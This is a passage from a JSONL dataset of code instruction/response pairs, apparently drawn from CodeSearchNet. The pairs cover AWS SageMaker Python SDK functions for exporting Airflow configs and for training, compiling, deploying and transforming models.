{"SOURCE": "codesearchnet", "instruction": "How would you implement a function in Python 3 that\nexports Airflow model config from a SageMaker model", "response": "def model_config(instance_type, model, role=None, image=None):\n    \"\"\"Export Airflow model config from a SageMaker model\n\n    Args:\n        instance_type (str): The EC2 instance type to deploy this Model to. For example, 'ml.p2.xlarge'\n        model (sagemaker.model.FrameworkModel): The SageMaker model to export Airflow config from\n        role (str): The ``ExecutionRoleArn`` IAM Role ARN for the model\n        image (str): An container image to use for deploying the model\n\n    Returns:\n        dict: Model config that can be directly used by SageMakerModelOperator in Airflow. It can also be part\n        of the config used by SageMakerEndpointOperator and SageMakerTransformOperator in Airflow.\n    \"\"\"\n    s3_operations = {}\n    model.image = image or model.image\n\n    if isinstance(model, sagemaker.model.FrameworkModel):\n        container_def = prepare_framework_container_def(model, instance_type, s3_operations)\n    else:\n        container_def = model.prepare_container_def(instance_type)\n        base_name = utils.base_name_from_image(container_def['Image'])\n        model.name = model.name or utils.name_from_base(base_name)\n\n    primary_container = session._expand_container_def(container_def)\n\n    config = {\n        'ModelName': model.name,\n        'PrimaryContainer': primary_container,\n        'ExecutionRoleArn': role or model.role\n    }\n\n    if model.vpc_config:\n        config['VpcConfig'] = model.vpc_config\n\n    if s3_operations:\n        config['S3Operations'] = s3_operations\n\n    return config"}
{"SOURCE": "codesearchnet", "instruction": "Can you tell what is the following Python 3 function doing\ndef model_config_from_estimator(instance_type, estimator, task_id, task_type, role=None, image=None, name=None,\n                                model_server_workers=None, vpc_config_override=vpc_utils.VPC_CONFIG_DEFAULT):\n    \"\"\"Export Airflow model config from a SageMaker estimator\n\n    Args:\n        instance_type (str): The EC2 instance type to deploy this Model to. For example, 'ml.p2.xlarge'\n        estimator (sagemaker.model.EstimatorBase): The SageMaker estimator to export Airflow config from.\n            It has to be an estimator associated with a training job.\n        task_id (str): The task id of any airflow.contrib.operators.SageMakerTrainingOperator or\n            airflow.contrib.operators.SageMakerTuningOperator that generates training jobs in the DAG. The model config\n            is built based on the training job generated in this operator.\n        task_type (str): Whether the task is from SageMakerTrainingOperator or SageMakerTuningOperator. Values can be\n            'training', 'tuning' or None (which means training job is not from any task).\n        role (str): The ``ExecutionRoleArn`` IAM Role ARN for the model\n        image (str): An container image to use for deploying the model\n        name (str): Name of the model\n        model_server_workers (int): The number of worker processes used by the inference server.\n            If None, server will use one worker per vCPU. Only effective when estimator is a\n            SageMaker framework.\n        vpc_config_override (dict[str, list[str]]): Override for VpcConfig set on the model.\n            Default: use subnets and security groups from this Estimator.\n            * 'Subnets' (list[str]): List of subnet ids.\n            * 'SecurityGroupIds' (list[str]): List of security group ids.\n\n    Returns:\n        dict: Model config that can be directly used by SageMakerModelOperator in Airflow. It can also be part\n            of the config used by SageMakerEndpointOperator in Airflow.\n    \"\"\"\n    update_estimator_from_task(estimator, task_id, task_type)\n    if isinstance(estimator, sagemaker.estimator.Estimator):\n        model = estimator.create_model(role=role, image=image, vpc_config_override=vpc_config_override)\n    elif isinstance(estimator, sagemaker.amazon.amazon_estimator.AmazonAlgorithmEstimatorBase):\n        model = estimator.create_model(vpc_config_override=vpc_config_override)\n    elif isinstance(estimator, sagemaker.estimator.Framework):\n        model = estimator.create_model(model_server_workers=model_server_workers, role=role,\n                                       vpc_config_override=vpc_config_override)\n    else:\n        raise TypeError('Estimator must be one of sagemaker.estimator.Estimator, sagemaker.estimator.Framework'\n                        ' or sagemaker.amazon.amazon_estimator.AmazonAlgorithmEstimatorBase.')\n    model.name = name\n\n    return model_config(instance_type, model, role, image)", "response": "Export Airflow model config from an estimator."}
{"SOURCE": "codesearchnet", "instruction": "Create a Python 3 function to\nexport Airflow transform config from a SageMaker transformer.", "response": "def transform_config(transformer, data, data_type='S3Prefix', content_type=None, compression_type=None,\n                     split_type=None, job_name=None):\n    \"\"\"Export Airflow transform config from a SageMaker transformer\n\n    Args:\n        transformer (sagemaker.transformer.Transformer): The SageMaker transformer to export Airflow\n            config from.\n        data (str): Input data location in S3.\n        data_type (str): What the S3 location defines (default: 'S3Prefix'). Valid values:\n\n            * 'S3Prefix' - the S3 URI defines a key name prefix. All objects with this prefix will be used as\n                inputs for the transform job.\n            * 'ManifestFile' - the S3 URI points to a single manifest file listing each S3 object to use as\n                an input for the transform job.\n\n        content_type (str): MIME type of the input data (default: None).\n        compression_type (str): Compression type of the input data, if compressed (default: None).\n            Valid values: 'Gzip', None.\n        split_type (str): The record delimiter for the input object (default: 'None').\n            Valid values: 'None', 'Line', 'RecordIO', and 'TFRecord'.\n        job_name (str): job name (default: None). If not specified, one will be generated.\n\n    Returns:\n        dict: Transform config that can be directly used by SageMakerTransformOperator in Airflow.\n    \"\"\"\n    if job_name is not None:\n        transformer._current_job_name = job_name\n    else:\n        base_name = transformer.base_transform_job_name\n        transformer._current_job_name = utils.name_from_base(base_name) \\\n            if base_name is not None else transformer.model_name\n\n    if transformer.output_path is None:\n        transformer.output_path = 's3://{}/{}'.format(\n            transformer.sagemaker_session.default_bucket(), transformer._current_job_name)\n\n    job_config = sagemaker.transformer._TransformJob._load_config(\n        data, data_type, content_type, compression_type, split_type, transformer)\n\n    config = {\n        'TransformJobName': transformer._current_job_name,\n        'ModelName': transformer.model_name,\n        'TransformInput': job_config['input_config'],\n        'TransformOutput': job_config['output_config'],\n        'TransformResources': job_config['resource_config'],\n    }\n\n    if transformer.strategy is not None:\n        config['BatchStrategy'] = transformer.strategy\n\n    if transformer.max_concurrent_transforms is not None:\n        config['MaxConcurrentTransforms'] = transformer.max_concurrent_transforms\n\n    if transformer.max_payload is not None:\n        config['MaxPayloadInMB'] = transformer.max_payload\n\n    if transformer.env is not None:\n        config['Environment'] = transformer.env\n\n    if transformer.tags is not None:\n        config['Tags'] = transformer.tags\n\n    return config"}
{"SOURCE": "codesearchnet", "instruction": "Can you generate the documentation for the following Python 3 function\ndef transform_config_from_estimator(estimator, task_id, task_type, instance_count, instance_type, data,\n                                    data_type='S3Prefix', content_type=None, compression_type=None, split_type=None,\n                                    job_name=None, model_name=None, strategy=None, assemble_with=None, output_path=None,\n                                    output_kms_key=None, accept=None, env=None, max_concurrent_transforms=None,\n                                    max_payload=None, tags=None, role=None, volume_kms_key=None,\n                                    model_server_workers=None, image=None, vpc_config_override=None):\n    \"\"\"Export Airflow transform config from a SageMaker estimator\n\n    Args:\n        estimator (sagemaker.model.EstimatorBase): The SageMaker estimator to export Airflow config from.\n            It has to be an estimator associated with a training job.\n        task_id (str): The task id of any airflow.contrib.operators.SageMakerTrainingOperator or\n            airflow.contrib.operators.SageMakerTuningOperator that generates training jobs in the DAG. The transform\n            config is built based on the training job generated in this operator.\n        task_type (str): Whether the task is from SageMakerTrainingOperator or SageMakerTuningOperator. Values can be\n            'training', 'tuning' or None (which means training job is not from any task).\n        instance_count (int): Number of EC2 instances to use.\n        instance_type (str): Type of EC2 instance to use, for example, 'ml.c4.xlarge'.\n        data (str): Input data location in S3.\n        data_type (str): What the S3 location defines (default: 'S3Prefix'). Valid values:\n\n            * 'S3Prefix' - the S3 URI defines a key name prefix. All objects with this prefix will be used as\n                inputs for the transform job.\n            * 'ManifestFile' - the S3 URI points to a single manifest file listing each S3 object to use as\n                an input for the transform job.\n\n        content_type (str): MIME type of the input data (default: None).\n        compression_type (str): Compression type of the input data, if compressed (default: None).\n            Valid values: 'Gzip', None.\n        split_type (str): The record delimiter for the input object (default: 'None').\n            Valid values: 'None', 'Line', 'RecordIO', and 'TFRecord'.\n        job_name (str): transform job name (default: None). If not specified, one will be generated.\n        model_name (str): model name (default: None). If not specified, one will be generated.\n        strategy (str): The strategy used to decide how to batch records in a single request (default: None).\n            Valid values: 'MULTI_RECORD' and 'SINGLE_RECORD'.\n        assemble_with (str): How the output is assembled (default: None). Valid values: 'Line' or 'None'.\n        output_path (str): S3 location for saving the transform result. If not specified, results are stored to\n            a default bucket.\n        output_kms_key (str): Optional. KMS key ID for encrypting the transform output (default: None).\n        accept (str): The content type accepted by the endpoint deployed during the transform job.\n        env (dict): Environment variables to be set for use during the transform job (default: None).\n        max_concurrent_transforms (int): The maximum number of HTTP requests to be made to\n            each individual transform container at one time.\n        max_payload (int): Maximum size of the payload in a single HTTP request to the container in MB.\n        tags (list[dict]): List of tags for labeling a transform job. If none specified, then the tags used for\n            the training job are used for the transform job.\n        role (str): The ``ExecutionRoleArn`` IAM Role ARN for the ``Model``, which is also used during\n            transform jobs. If not specified, the role from the Estimator will be used.\n        volume_kms_key (str): Optional. KMS key ID for encrypting the volume attached to the ML\n            compute instance (default: None).\n        model_server_workers (int): Optional. The number of worker processes used by the inference server.\n            If None, server will use one worker per vCPU.\n        image (str): An container image to use for deploying the model\n        vpc_config_override (dict[str, list[str]]): Override for VpcConfig set on the model.\n            Default: use subnets and security groups from this Estimator.\n            * 'Subnets' (list[str]): List of subnet ids.\n            * 'SecurityGroupIds' (list[str]): List of security group ids.\n\n    Returns:\n        dict: Transform config that can be directly used by SageMakerTransformOperator in Airflow.\n    \"\"\"\n    model_base_config = model_config_from_estimator(instance_type=instance_type, estimator=estimator, task_id=task_id,\n                                                    task_type=task_type, role=role, image=image, name=model_name,\n                                                    model_server_workers=model_server_workers,\n                                                    vpc_config_override=vpc_config_override)\n\n    if isinstance(estimator, sagemaker.estimator.Framework):\n        transformer = estimator.transformer(instance_count, instance_type, strategy, assemble_with, output_path,\n                                            output_kms_key, accept, env, max_concurrent_transforms,\n                                            max_payload, tags, role, model_server_workers, volume_kms_key)\n    else:\n        transformer = estimator.transformer(instance_count, instance_type, strategy, assemble_with, output_path,\n                                            output_kms_key, accept, env, max_concurrent_transforms,\n                                            max_payload, tags, role, volume_kms_key)\n    transformer.model_name = model_base_config['ModelName']\n\n    transform_base_config = transform_config(transformer, data, data_type, content_type, compression_type,\n                                             split_type, job_name)\n\n    config = {\n        'Model': model_base_config,\n        'Transform': transform_base_config\n    }\n\n    return config", "response": "Export Airflow transform config from an estimator."}
{"SOURCE": "codesearchnet", "instruction": "Can you generate a brief explanation for the following Python 3 code\ndef deploy_config(model, initial_instance_count, instance_type, endpoint_name=None, tags=None):\n    model_base_config = model_config(instance_type, model)\n\n    production_variant = sagemaker.production_variant(model.name, instance_type, initial_instance_count)\n    name = model.name\n    config_options = {'EndpointConfigName': name, 'ProductionVariants': [production_variant]}\n    if tags is not None:\n        config_options['Tags'] = tags\n\n    endpoint_name = endpoint_name or name\n    endpoint_base_config = {\n        'EndpointName': endpoint_name,\n        'EndpointConfigName': name\n    }\n\n    config = {\n        'Model': model_base_config,\n        'EndpointConfig': config_options,\n        'Endpoint': endpoint_base_config\n    }\n\n    # if there is s3 operations needed for model, move it to root level of config\n    s3_operations = model_base_config.pop('S3Operations', None)\n    if s3_operations is not None:\n        config['S3Operations'] = s3_operations\n\n    return config", "response": "Export Airflow deploy config from a SageMaker model."}
{"SOURCE": "codesearchnet", "instruction": "Make a summary of the following Python 3 code\ndef deploy_config_from_estimator(estimator, task_id, task_type, initial_instance_count, instance_type,\n                                 model_name=None, endpoint_name=None, tags=None, **kwargs):\n    \"\"\"Export Airflow deploy config from a SageMaker estimator\n\n    Args:\n        estimator (sagemaker.model.EstimatorBase): The SageMaker estimator to export Airflow config from.\n            It has to be an estimator associated with a training job.\n        task_id (str): The task id of any airflow.contrib.operators.SageMakerTrainingOperator or\n            airflow.contrib.operators.SageMakerTuningOperator that generates training jobs in the DAG. The endpoint\n            config is built based on the training job generated in this operator.\n        task_type (str): Whether the task is from SageMakerTrainingOperator or SageMakerTuningOperator. Values can be\n            'training', 'tuning' or None (which means training job is not from any task).\n        initial_instance_count (int): Minimum number of EC2 instances to deploy to an endpoint for prediction.\n        instance_type (str): Type of EC2 instance to deploy to an endpoint for prediction,\n            for example, 'ml.c4.xlarge'.\n        model_name (str): Name to use for creating an Amazon SageMaker model. If not specified, one will be generated.\n        endpoint_name (str): Name to use for creating an Amazon SageMaker endpoint. If not specified, the name of\n            the SageMaker model is used.\n        tags (list[dict]): List of tags for labeling a training job. For more, see\n            https://docs.aws.amazon.com/sagemaker/latest/dg/API_Tag.html.\n        **kwargs: Passed to invocation of ``create_model()``. Implementations may customize\n            ``create_model()`` to accept ``**kwargs`` to customize model creation during deploy.\n            For more, see the implementation docs.\n\n    Returns:\n        dict: Deploy config that can be directly used by SageMakerEndpointOperator in Airflow.\n    \"\"\"\n    update_estimator_from_task(estimator, task_id, task_type)\n    model = estimator.create_model(**kwargs)\n    model.name = model_name\n    config = deploy_config(model, initial_instance_count, instance_type, endpoint_name, tags)\n    return config", "response": "Exports Airflow deploy config from an estimator."}
{"SOURCE": "codesearchnet", "instruction": "Implement a Python 3 function for\ncreating a model for deploying a resource in Amazon SageMaker.", "response": "def create_model(\n        self,\n        role=None,\n        predictor_cls=None,\n        serializer=None,\n        deserializer=None,\n        content_type=None,\n        accept=None,\n        vpc_config_override=vpc_utils.VPC_CONFIG_DEFAULT,\n        **kwargs\n    ):\n        \"\"\"Create a model to deploy.\n\n        The serializer, deserializer, content_type, and accept arguments are only used to define a default\n        RealTimePredictor. They are ignored if an explicit predictor class is passed in. Other arguments\n        are passed through to the Model class.\n\n        Args:\n            role (str): The ``ExecutionRoleArn`` IAM Role ARN for the ``Model``, which is also used during\n                transform jobs. If not specified, the role from the Estimator will be used.\n            predictor_cls (RealTimePredictor): The predictor class to use when deploying the model.\n            serializer (callable): Should accept a single argument, the input data, and return a sequence\n                of bytes. May provide a content_type attribute that defines the endpoint request content type\n            deserializer (callable): Should accept two arguments, the result data and the response content type,\n                and return a sequence of bytes. May provide a content_type attribute that defines th endpoint\n                response Accept content type.\n            content_type (str): The invocation ContentType, overriding any content_type from the serializer\n            accept (str): The invocation Accept, overriding any accept from the deserializer.\n            vpc_config_override (dict[str, list[str]]): Optional override for VpcConfig set on the model.\n                Default: use subnets and security groups from this Estimator.\n                * 'Subnets' (list[str]): List of subnet ids.\n                * 'SecurityGroupIds' (list[str]): List of security group ids.\n\n        Returns:\n            a Model ready for deployment.\n        \"\"\"\n        if predictor_cls is None:\n\n            def predict_wrapper(endpoint, session):\n                return RealTimePredictor(\n                    endpoint, session, serializer, deserializer, content_type, accept\n                )\n\n            predictor_cls = predict_wrapper\n\n        role = role or self.role\n\n        return sagemaker.ModelPackage(\n            role,\n            algorithm_arn=self.algorithm_arn,\n            model_data=self.model_data,\n            vpc_config=self.get_vpc_config(vpc_config_override),\n            sagemaker_session=self.sagemaker_session,\n            predictor_cls=predictor_cls,\n            **kwargs\n        )"}
{"SOURCE": "codesearchnet", "instruction": "Can you implement a function in Python 3 that\nreturns a Transformer that uses a SageMaker Model based on the training job.", "response": "def transformer(self, instance_count, instance_type, strategy=None, assemble_with=None, output_path=None,\n                    output_kms_key=None, accept=None, env=None, max_concurrent_transforms=None,\n                    max_payload=None, tags=None, role=None, volume_kms_key=None):\n        \"\"\"Return a ``Transformer`` that uses a SageMaker Model based on the training job. It reuses the\n        SageMaker Session and base job name used by the Estimator.\n\n        Args:\n            instance_count (int): Number of EC2 instances to use.\n            instance_type (str): Type of EC2 instance to use, for example, 'ml.c4.xlarge'.\n            strategy (str): The strategy used to decide how to batch records in a single request (default: None).\n                Valid values: 'MULTI_RECORD' and 'SINGLE_RECORD'.\n            assemble_with (str): How the output is assembled (default: None). Valid values: 'Line' or 'None'.\n            output_path (str): S3 location for saving the transform result. If not specified, results are stored to\n                a default bucket.\n            output_kms_key (str): Optional. KMS key ID for encrypting the transform output (default: None).\n            accept (str): The content type accepted by the endpoint deployed during the transform job.\n            env (dict): Environment variables to be set for use during the transform job (default: None).\n            max_concurrent_transforms (int): The maximum number of HTTP requests to be made to\n                each individual transform container at one time.\n            max_payload (int): Maximum size of the payload in a single HTTP request to the container in MB.\n            tags (list[dict]): List of tags for labeling a transform job. If none specified, then the tags used for\n                the training job are used for the transform job.\n            role (str): The ``ExecutionRoleArn`` IAM Role ARN for the ``Model``, which is also used during\n                transform jobs. If not specified, the role from the Estimator will be used.\n            volume_kms_key (str): Optional. KMS key ID for encrypting the volume attached to the ML\n                compute instance (default: None).\n        \"\"\"\n        role = role or self.role\n\n        if self.latest_training_job is not None:\n            model = self.create_model(role=role)\n            model._create_sagemaker_model()\n            model_name = model.name\n            transform_env = {}\n            if env is not None:\n                transform_env = model.env.copy()\n                transform_env.update(env)\n            if self._is_marketplace():\n                transform_env = None\n\n            tags = tags or self.tags\n        else:\n            raise RuntimeError('No finished training job found associated with this estimator')\n\n        return Transformer(model_name, instance_count, instance_type, strategy=strategy,\n                           assemble_with=assemble_with, output_path=output_path,\n                           output_kms_key=output_kms_key, accept=accept,\n                           max_concurrent_transforms=max_concurrent_transforms,\n                           max_payload=max_payload, env=transform_env, tags=tags,\n                           base_transform_job_name=self.base_job_name,\n                           volume_kms_key=volume_kms_key, sagemaker_session=self.sagemaker_session)"}
{"SOURCE": "codesearchnet", "instruction": "How would you code a function in Python 3 to\nset any values in the estimator that need to be set before training.", "response": "def _prepare_for_training(self, job_name=None):\n        \"\"\"Set any values in the estimator that need to be set before training.\n\n        Args:\n            * job_name (str): Name of the training job to be created. If not specified, one is generated,\n                using the base name given to the constructor if applicable.\n        \"\"\"\n        if job_name is not None:\n            self._current_job_name = job_name\n        else:\n            # honor supplied base_job_name or generate it\n            if self.base_job_name:\n                base_name = self.base_job_name\n            elif isinstance(self, sagemaker.algorithm.AlgorithmEstimator):\n                base_name = self.algorithm_arn.split('/')[-1]  # pylint: disable=no-member\n            else:\n                base_name = base_name_from_image(self.train_image())\n\n            self._current_job_name = name_from_base(base_name)\n\n        # if output_path was specified we use it otherwise initialize here.\n        # For Local Mode with local_code=True we don't need an explicit output_path\n        if self.output_path is None:\n            local_code = get_config_value('local.local_code', self.sagemaker_session.config)\n            if self.sagemaker_session.local_mode and local_code:\n                self.output_path = ''\n            else:\n                self.output_path = 's3://{}/'.format(self.sagemaker_session.default_bucket())"}
{"SOURCE": "codesearchnet", "instruction": "Write a Python 3 function that can\ntrain a model using the input training dataset.", "response": "def fit(self, inputs=None, wait=True, logs=True, job_name=None):\n        \"\"\"Train a model using the input training dataset.\n\n        The API calls the Amazon SageMaker CreateTrainingJob API to start model training.\n        The API uses configuration you provided to create the estimator and the\n        specified input training data to send the CreatingTrainingJob request to Amazon SageMaker.\n\n        This is a synchronous operation. After the model training successfully completes,\n        you can call the ``deploy()`` method to host the model using the Amazon SageMaker hosting services.\n\n        Args:\n            inputs (str or dict or sagemaker.session.s3_input): Information about the training data.\n                This can be one of three types:\n\n                * (str) the S3 location where training data is saved.\n\n                * (dict[str, str] or dict[str, sagemaker.session.s3_input]) If using multiple channels for\n                    training data, you can specify a dict mapping channel names\n                    to strings or :func:`~sagemaker.session.s3_input` objects.\n                * (sagemaker.session.s3_input) - channel configuration for S3 data sources that can provide\n                    additional information as well as the path to the training dataset.\n                    See :func:`sagemaker.session.s3_input` for full details.\n            wait (bool): Whether the call should wait until the job completes (default: True).\n            logs (bool): Whether to show the logs produced by the job.\n                Only meaningful when wait is True (default: True).\n            job_name (str): Training job name. If not specified, the estimator generates a default job name,\n                based on the training image name and current timestamp.\n        \"\"\"\n        self._prepare_for_training(job_name=job_name)\n\n        self.latest_training_job = _TrainingJob.start_new(self, inputs)\n        if wait:\n            self.latest_training_job.wait(logs=logs)"}
{"SOURCE": "codesearchnet", "instruction": "Write a Python 3 function for\ncompiling a SageMaker Neo model using the input model.", "response": "def compile_model(self, target_instance_family, input_shape, output_path, framework=None, framework_version=None,\n                      compile_max_run=5 * 60, tags=None, **kwargs):\n        \"\"\"Compile a Neo model using the input model.\n\n        Args:\n            target_instance_family (str): Identifies the device that you want to run your model after compilation, for\n                example: ml_c5. Allowed strings are: ml_c5, ml_m5, ml_c4, ml_m4, jetsontx1, jetsontx2, ml_p2, ml_p3,\n                deeplens, rasp3b\n            input_shape (dict): Specifies the name and shape of the expected inputs for your trained model in json\n                dictionary form, for example: {'data':[1,3,1024,1024]}, or {'var1': [1,1,28,28], 'var2':[1,1,28,28]}\n            output_path (str): Specifies where to store the compiled model\n            framework (str): The framework that is used to train the original model. Allowed values: 'mxnet',\n                'tensorflow', 'pytorch', 'onnx', 'xgboost'\n            framework_version (str): The version of the framework\n            compile_max_run (int): Timeout in seconds for compilation (default: 3 * 60).\n                After this amount of time Amazon SageMaker Neo terminates the compilation job regardless of its\n                current status.\n            tags (list[dict]): List of tags for labeling a compilation job. For more, see\n                https://docs.aws.amazon.com/sagemaker/latest/dg/API_Tag.html.\n            **kwargs: Passed to invocation of ``create_model()``. Implementations may customize\n                ``create_model()`` to accept ``**kwargs`` to customize model creation during deploy.\n                For more, see the implementation docs.\n        Returns:\n            sagemaker.model.Model: A SageMaker ``Model`` object. See :func:`~sagemaker.model.Model` for full details.\n        \"\"\"\n        if target_instance_family not in NEO_ALLOWED_TARGET_INSTANCE_FAMILY:\n            raise ValueError(\"Please use valid target_instance_family,\"\n                             \"allowed values: {}\".format(NEO_ALLOWED_TARGET_INSTANCE_FAMILY))\n        if framework and framework not in NEO_ALLOWED_FRAMEWORKS:\n            raise ValueError(\"Please use valid framework, allowed values: {}\".format(NEO_ALLOWED_FRAMEWORKS))\n\n        if (framework is None) != (framework_version is None):\n            raise ValueError(\"You should provide framework and framework_version at the same time.\")\n\n        model = self.create_model(**kwargs)\n\n        self._compiled_models[target_instance_family] = model.compile(target_instance_family,\n                                                                      input_shape,\n                                                                      output_path,\n                                                                      self.role,\n                                                                      tags,\n                                                                      self._compilation_job_name(),\n                                                                      compile_max_run,\n                                                                      framework=framework,\n                                                                      framework_version=framework_version)\n        return self._compiled_models[target_instance_family]"}
{"SOURCE": "codesearchnet", "instruction": "Write a Python 3 function for\nattaching to an existing training job.", "response": "def attach(cls, training_job_name, sagemaker_session=None, model_channel_name='model'):\n        \"\"\"Attach to an existing training job.\n\n        Create an Estimator bound to an existing training job, each subclass is responsible to implement\n        ``_prepare_init_params_from_job_description()`` as this method delegates the actual conversion of a training\n        job description to the arguments that the class constructor expects. After attaching, if the training job has a\n        Complete status, it can be ``deploy()`` ed to create a SageMaker Endpoint and return a ``Predictor``.\n\n        If the training job is in progress, attach will block and display log messages\n        from the training job, until the training job completes.\n\n        Args:\n            training_job_name (str): The name of the training job to attach to.\n            sagemaker_session (sagemaker.session.Session): Session object which manages interactions with\n                Amazon SageMaker APIs and any other AWS services needed. If not specified, the estimator creates one\n                using the default AWS configuration chain.\n            model_channel_name (str): Name of the channel where pre-trained model data will be downloaded (default:\n                'model'). If no channel with the same name exists in the training job, this option will be ignored.\n\n        Examples:\n            >>> my_estimator.fit(wait=False)\n            >>> training_job_name = my_estimator.latest_training_job.name\n            Later on:\n            >>> attached_estimator = Estimator.attach(training_job_name)\n            >>> attached_estimator.deploy()\n\n        Returns:\n            Instance of the calling ``Estimator`` Class with the attached training job.\n        \"\"\"\n        sagemaker_session = sagemaker_session or Session()\n\n        job_details = sagemaker_session.sagemaker_client.describe_training_job(TrainingJobName=training_job_name)\n        init_params = cls._prepare_init_params_from_job_description(job_details, model_channel_name)\n\n        estimator = cls(sagemaker_session=sagemaker_session, **init_params)\n        estimator.latest_training_job = _TrainingJob(sagemaker_session=sagemaker_session,\n                                                     job_name=init_params['base_job_name'])\n        estimator.latest_training_job.wait()\n        return estimator"}
{"SOURCE": "codesearchnet", "instruction": "Write a Python 3 function that can\ndeploy the trained model to an Amazon SageMaker endpoint and return a SageMaker. RealTimePredictor object.", "response": "def deploy(self, initial_instance_count, instance_type, accelerator_type=None, endpoint_name=None,\n               use_compiled_model=False, update_endpoint=False, **kwargs):\n        \"\"\"Deploy the trained model to an Amazon SageMaker endpoint and return a ``sagemaker.RealTimePredictor`` object.\n\n        More information:\n        http://docs.aws.amazon.com/sagemaker/latest/dg/how-it-works-training.html\n\n        Args:\n            initial_instance_count (int): Minimum number of EC2 instances to deploy to an endpoint for prediction.\n            instance_type (str): Type of EC2 instance to deploy to an endpoint for prediction,\n                for example, 'ml.c4.xlarge'.\n            accelerator_type (str): Type of Elastic Inference accelerator to attach to an endpoint for model loading\n                and inference, for example, 'ml.eia1.medium'. If not specified, no Elastic Inference accelerator\n                will be attached to the endpoint.\n                For more information: https://docs.aws.amazon.com/sagemaker/latest/dg/ei.html\n            endpoint_name (str): Name to use for creating an Amazon SageMaker endpoint. If not specified, the name of\n                the training job is used.\n            use_compiled_model (bool): Flag to select whether to use compiled (optimized) model. Default: False.\n            update_endpoint (bool): Flag to update the model in an existing Amazon SageMaker endpoint.\n                If True, this will deploy a new EndpointConfig to an already existing endpoint and delete resources\n                corresponding to the previous EndpointConfig. Default: False\n            tags(List[dict[str, str]]): Optional. The list of tags to attach to this specific endpoint. Example:\n                    >>> tags = [{'Key': 'tagname', 'Value': 'tagvalue'}]\n                    For more information about tags, see https://boto3.amazonaws.com/v1/documentation\\\n                    /api/latest/reference/services/sagemaker.html#SageMaker.Client.add_tags\n\n            **kwargs: Passed to invocation of ``create_model()``. Implementations may customize\n                ``create_model()`` to accept ``**kwargs`` to customize model creation during deploy.\n                For more, see the implementation docs.\n\n        Returns:\n            sagemaker.predictor.RealTimePredictor: A predictor that provides a ``predict()`` method,\n                which can be used to send requests to the Amazon SageMaker endpoint and obtain inferences.\n        \"\"\"\n        self._ensure_latest_training_job()\n        endpoint_name = endpoint_name or self.latest_training_job.name\n        self.deploy_instance_type = instance_type\n        if use_compiled_model:\n            family = '_'.join(instance_type.split('.')[:-1])\n            if family not in self._compiled_models:\n                raise ValueError(\"No compiled model for {}. \"\n                                 \"Please compile one with compile_model before deploying.\".format(family))\n            model = self._compiled_models[family]\n        else:\n            model = self.create_model(**kwargs)\n        return model.deploy(\n            instance_type=instance_type,\n            initial_instance_count=initial_instance_count,\n            accelerator_type=accelerator_type,\n            endpoint_name=endpoint_name,\n            update_endpoint=update_endpoint,\n            tags=self.tags)"}
{"SOURCE": "codesearchnet", "instruction": "Can you implement a function in Python 3 that\nconverts the job description to init params that can be handled by the class constructor.", "response": "def _prepare_init_params_from_job_description(cls, job_details, model_channel_name=None):\n        \"\"\"Convert the job description to init params that can be handled by the class constructor\n\n        Args:\n            job_details: the returned job details from a describe_training_job API call.\n            model_channel_name (str): Name of the channel where pre-trained model data will be downloaded.\n\n        Returns:\n             dictionary: The transformed init_params\n\n        \"\"\"\n        init_params = dict()\n\n        init_params['role'] = job_details['RoleArn']\n        init_params['train_instance_count'] = job_details['ResourceConfig']['InstanceCount']\n        init_params['train_instance_type'] = job_details['ResourceConfig']['InstanceType']\n        init_params['train_volume_size'] = job_details['ResourceConfig']['VolumeSizeInGB']\n        init_params['train_max_run'] = job_details['StoppingCondition']['MaxRuntimeInSeconds']\n        init_params['input_mode'] = job_details['AlgorithmSpecification']['TrainingInputMode']\n        init_params['base_job_name'] = job_details['TrainingJobName']\n        init_params['output_path'] = job_details['OutputDataConfig']['S3OutputPath']\n        init_params['output_kms_key'] = job_details['OutputDataConfig']['KmsKeyId']\n\n        has_hps = 'HyperParameters' in job_details\n        init_params['hyperparameters'] = job_details['HyperParameters'] if has_hps else {}\n\n        if 'TrainingImage' in job_details['AlgorithmSpecification']:\n            init_params['image'] = job_details['AlgorithmSpecification']['TrainingImage']\n        elif 'AlgorithmName' in job_details['AlgorithmSpecification']:\n            init_params['algorithm_arn'] = job_details['AlgorithmSpecification']['AlgorithmName']\n        else:\n            raise RuntimeError('Invalid AlgorithmSpecification. Either TrainingImage or '\n                               'AlgorithmName is expected. None was found.')\n\n        if 'MetricDefinitons' in job_details['AlgorithmSpecification']:\n            init_params['metric_definitions'] = job_details['AlgorithmSpecification']['MetricsDefinition']\n\n        if 'EnableInterContainerTrafficEncryption' in job_details:\n            init_params['encrypt_inter_container_traffic'] = \\\n                job_details['EnableInterContainerTrafficEncryption']\n\n        subnets, security_group_ids = vpc_utils.from_dict(job_details.get(vpc_utils.VPC_CONFIG_KEY))\n        if subnets:\n            init_params['subnets'] = subnets\n        if security_group_ids:\n            init_params['security_group_ids'] = security_group_ids\n\n        if 'InputDataConfig' in job_details and model_channel_name:\n            for channel in job_details['InputDataConfig']:\n                if channel['ChannelName'] == model_channel_name:\n                    init_params['model_channel_name'] = model_channel_name\n                    init_params['model_uri'] = channel['DataSource']['S3DataSource']['S3Uri']\n                    break\n\n        return init_params"}
{"SOURCE": "codesearchnet", "instruction": "Make a summary of the following Python 3 code\ndef delete_endpoint(self):\n        self._ensure_latest_training_job(error_message='Endpoint was not created yet')\n        self.sagemaker_session.delete_endpoint(self.latest_training_job.name)", "response": "Delete an Amazon SageMaker Endpoint."}
{"SOURCE": "codesearchnet", "instruction": "How would you implement a function in Python 3 that\nreturns a Transformer that uses a SageMaker Model based on the training job.", "response": "def transformer(self, instance_count, instance_type, strategy=None, assemble_with=None, output_path=None,\n                    output_kms_key=None, accept=None, env=None, max_concurrent_transforms=None,\n                    max_payload=None, tags=None, role=None, volume_kms_key=None):\n        \"\"\"Return a ``Transformer`` that uses a SageMaker Model based on the training job. It reuses the\n        SageMaker Session and base job name used by the Estimator.\n\n        Args:\n            instance_count (int): Number of EC2 instances to use.\n            instance_type (str): Type of EC2 instance to use, for example, 'ml.c4.xlarge'.\n            strategy (str): The strategy used to decide how to batch records in a single request (default: None).\n                Valid values: 'MULTI_RECORD' and 'SINGLE_RECORD'.\n            assemble_with (str): How the output is assembled (default: None). Valid values: 'Line' or 'None'.\n            output_path (str): S3 location for saving the transform result. If not specified, results are stored to\n                a default bucket.\n            output_kms_key (str): Optional. KMS key ID for encrypting the transform output (default: None).\n            accept (str): The content type accepted by the endpoint deployed during the transform job.\n            env (dict): Environment variables to be set for use during the transform job (default: None).\n            max_concurrent_transforms (int): The maximum number of HTTP requests to be made to\n                each individual transform container at one time.\n            max_payload (int): Maximum size of the payload in a single HTTP request to the container in MB.\n            tags 